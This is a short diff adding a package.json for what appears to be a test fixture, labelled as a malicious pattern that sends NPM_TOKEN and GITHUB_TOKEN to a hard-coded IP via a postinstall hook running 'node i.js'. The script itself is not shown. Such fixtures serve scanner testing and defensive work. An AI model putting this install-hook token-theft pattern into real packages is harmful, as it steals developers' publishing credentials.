@@ -1,0 +1,6 @@
+{
+  "name": "lwfx-steal-env-token",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): sends NPM_TOKEN and GITHUB_TOKEN to a hard-coded IP",
+  "scripts": { "postinstall": "node i.js" }
+}
